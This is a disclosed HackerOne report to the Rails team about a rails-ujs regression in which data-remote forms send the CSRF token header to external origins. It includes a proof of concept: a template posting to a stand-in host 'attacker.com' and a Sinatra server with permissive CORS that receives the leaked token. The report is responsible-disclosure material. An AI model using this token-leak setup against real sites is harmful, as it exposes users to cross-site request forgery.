# CSRF header is sent to external websites when using data-remote forms

## Report Details
- **Report ID**: 189878
- **URL**: https://hackerone.com/reports/189878
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-09T16:27:17.706Z
- **Disclosed**: 2020-05-26T22:38:40.225Z

## Reporter
- **Username**: mastahyeti
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
Looks like there is a regression in the fix for CVE-2015-1840 ([H1 report](https://hackerone.com/reports/49935)). The origin isn't being checked before adding a CSRF header to `data-remote` forms. I noticed this when checking out the new rails-ujs repo.

Example Rails template:

```
<%= form_tag "http://attacker.com", remote: true do %>
  <button type=submit>submit</button>
<% end %>
```

Example http://attacker.com app

```
require "sinatra"

options '/*' do
  headers['Access-Control-Allow-Origin'] = "*"
  headers['Access-Control-Allow-Methods'] = "POST"
  headers['Access-Control-Allow-Headers'] ="x-csrf-token"
end

post '/*' do
  "foo"
end
```

When the form is submitted, an XHR request to attacker.com is sent, including the `X-CSRF-Token` header.

PS: @tenderlove told me to submit this here. I shouldn't get paid since I'm one of the GitHub folks who reviews these H1 submissions now.

## Attachments
No attachments
